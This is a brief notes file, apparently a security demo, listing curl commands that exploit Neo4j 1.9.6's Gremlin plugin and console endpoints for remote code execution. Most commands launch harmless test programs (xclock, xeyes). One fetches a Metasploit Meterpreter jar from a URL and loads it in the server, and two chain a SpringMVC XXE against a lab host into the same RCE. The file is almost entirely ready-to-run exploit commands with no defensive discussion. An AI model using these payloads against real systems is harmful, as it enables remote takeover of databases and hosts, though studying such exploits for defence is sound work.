Neo4J version 1.9.6

# Local Neo4J/Gremlin RCE exploits (macos)
curl -X POST http://localhost:7474/db/data/ext/GremlinPlugin/graphdb/execute_script -d '{"script":"rt = Runtime.getRuntime().exec(\"xclock\")", "params": {} }' -H "Content-Type: application/json"

curl -X POST http://localhost:7474/db/manage/server/console/ -d '{"command":"rt = Runtime.getRuntime().exec(\"xclock\");","engine":"gremlin"}' -H "Content-Type: application/json"

# Local Neo4J/Gremlin RCE exploits (linux)
curl -X POST http://localhost:7474/db/data/ext/GremlinPlugin/graphdb/execute_script -d '{"script":"import java.lang.Runtime;rt = Runtime.getRuntime().exec(\"xeyes\")", "params": {} }' -H "Content-Type: application/json"

curl -X POST http://localhost:7474/db/manage/server/console/ -d '{"command":"rt = Runtime.getRuntime().exec(\"xeyes\");","engine":"gremlin"}' -H "Content-Type: application/json"

# Local Neo4J/Gremlin Meterpreter exploits 
curl -X POST http://localhost:7474/db/manage/server/console/ -d '{"command":"URL url=new URL(\"http://localhost/~alvaro/met.jar\");def urlList = [] << url;URL[] urls = urlList.toArray();new URLClassLoader(urls).loadClass(\"metasploit.Payload\").newInstance()","engine":"gremlin"}' -H "Content-Type: application/json"

# Remote SpringMVC XXE + Neo4J/Gremlin RCE exploit (linux)
curl --header "content-type: application/xml" --header "Accept: application/xml" --data @xxe_neo4j_xclock.xml -X POST  "http://192.168.239.146:8080/contacts"

# Remote SpringMVC XXE + Neo4J/Gremlin Meterpreter exploit
curl --header "content-type: application/xml" --header "Accept: application/xml" --data @xxe_neo4j_meterpreter.xml -X POST  "http://192.168.239.146:8080/contacts"



